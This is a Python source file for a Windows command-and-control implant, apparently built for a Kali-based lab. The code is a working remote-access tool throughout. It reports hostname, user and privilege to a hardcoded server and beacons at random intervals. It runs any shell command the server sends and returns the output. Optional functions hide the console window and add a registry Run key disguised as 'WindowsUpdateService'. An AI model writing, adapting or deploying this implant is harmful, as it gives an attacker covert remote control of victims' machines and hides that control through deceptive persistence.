#!/usr/bin/env python3
"""
C2 Implant for Windows
Works on Windows 7/10/11
"""

import subprocess
import requests
import time
import socket
import platform
import os
import sys
import json
import random
import ctypes

# Disable SSL warnings (for testing)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Server configuration
SERVER_URL = "https://172.24.1.83:443"  # Change to your Kali IP
AGENT_ID = None

def is_admin():
    """Check if running as administrator"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def get_windows_info():
    """Collect Windows system information"""
    try:
        # Get Windows version
        version = platform.version()
        release = platform.release()
        
        # Get computer name
        hostname = socket.gethostname()
        
        # Get username
        username = os.environ.get('USERNAME', 'unknown')
        
        # Get IP address
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
        except:
            ip = "127.0.0.1"
        
        return {
            "hostname": hostname,
            "username": username,
            "os_type": f"Windows {release}",
            "os_version": version,
            "ip_address": ip,
            "privilege": "admin" if is_admin() else "user",
            "architecture": platform.machine()
        }
    except Exception as e:
        return {
            "hostname": "windows-vm",
            "username": "user",
            "os_type": "Windows",
            "ip_address": "127.0.0.1"
        }

def register():
    """Register with C2 server"""
    global AGENT_ID
    for attempt in range(3):
        try:
            print(f"[*] Registration attempt {attempt+1}/3")
            info = get_windows_info()
            print(f"[*] Hostname: {info['hostname']}")
            print(f"[*] Username: {info['username']}")
            print(f"[*] Privilege: {info.get('privilege', 'unknown')}")
            
            response = requests.post(
                f"{SERVER_URL}/api/register",
                json=info,
                verify=False,
                timeout=5
            )
            
            if response.status_code == 200:
                AGENT_ID = response.json()['agent_id']
                print(f"[+] Successfully registered with ID: {AGENT_ID}")
                return True
            else:
                print(f"[-] Registration failed: {response.status_code}")
        except Exception as e:
            print(f"[-] Attempt {attempt+1} failed: {e}")
            time.sleep(3)
    
    return False

def execute_command(command):
    """Execute Windows command"""
    try:
        # Handle cd command
        if command.lower().startswith('cd '):
            path = command[3:].strip()
            try:
                os.chdir(path)
                return f"[+] Changed to: {os.getcwd()}"
            except Exception as e:
                return f"[-] Failed: {e}"
        
        # Handle special Windows commands
        if command.lower() == 'whoami':
            result = subprocess.run('whoami', shell=True, capture_output=True, text=True)
            return result.stdout.strip()
        
        if command.lower() == 'ipconfig':
            result = subprocess.run('ipconfig', shell=True, capture_output=True, text=True)
            return result.stdout
        
        if command.lower() == 'tasklist':
            result = subprocess.run('tasklist', shell=True, capture_output=True, text=True)
            return result.stdout[:2000]  # Limit output
        
        # Execute general command
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        
        output = result.stdout if result.stdout else result.stderr
        if not output:
            output = "[+] Command executed successfully"
        
        return output
        
    except subprocess.TimeoutExpired:
        return "[-] Command timeout (30s)"
    except Exception as e:
        return f"[-] Error: {str(e)}"

def beacon():
    """Main beacon loop"""
    print("[*] Starting beacon every 10 seconds...")
    print("[*] Waiting for commands from server...")
    
    while True:
        try:
            # Send heartbeat
            heartbeat = {
                'agent_id': AGENT_ID,
                'timestamp': time.time(),
                'working_dir': os.getcwd()
            }
            
            response = requests.post(
                f"{SERVER_URL}/api/beacon",
                json=heartbeat,
                verify=False,
                timeout=10
            )
            
            if response.status_code == 200:
                tasks = response.json().get('tasks', [])
                
                for task in tasks:
                    print(f"\n[*] New task: {task['command']}")
                    output = execute_command(task['command'])
                    print(f"[+] Output:\n{output[:200]}")
                    
                    # Send result back
                    requests.post(
                        f"{SERVER_URL}/api/task_result",
                        json={
                            'task_id': task['id'],
                            'output': output,
                            'status': 'completed'
                        },
                        verify=False,
                        timeout=10
                    )
            
            # Random sleep between 5-15 seconds
            sleep_time = random.randint(5, 15)
            time.sleep(sleep_time)
            
        except requests.exceptions.ConnectionError:
            print("[-] Connection lost, retrying in 30 seconds...")
            time.sleep(30)
        except Exception as e:
            print(f"[-] Beacon error: {e}")
            time.sleep(30)

def hide_console():
    """Hide console window (Windows only)"""
    try:
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)  # 0 = SW_HIDE
    except:
        pass

def install_persistence():
    """Install persistence (optional)"""
    try:
        import _winreg as winreg
        
        # Get current script path
        script_path = os.path.abspath(sys.argv[0])
        
        # Add to registry
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "WindowsUpdateService", 0, winreg.REG_SZ, script_path)
        
        print("[+] Persistence installed")
        return True
    except Exception as e:
        print(f"[-] Persistence failed: {e}")
        return False

if __name__ == "__main__":
    print("="*60)
    print("Windows C2 Implant")
    print("="*60)
    print(f"[*] Target Server: {SERVER_URL}")
    print(f"[*] Windows Version: {platform.version()}")
    print(f"[*] Administrator: {is_admin()}")
    print("="*60)
    
    # Optional: Hide console (uncomment for stealth)
    # hide_console()
    
    # Optional: Install persistence
    # install_persistence()
    
    if register():
        beacon()
    else:
        print("[-] Failed to register. Exiting...")
        time.sleep(10)
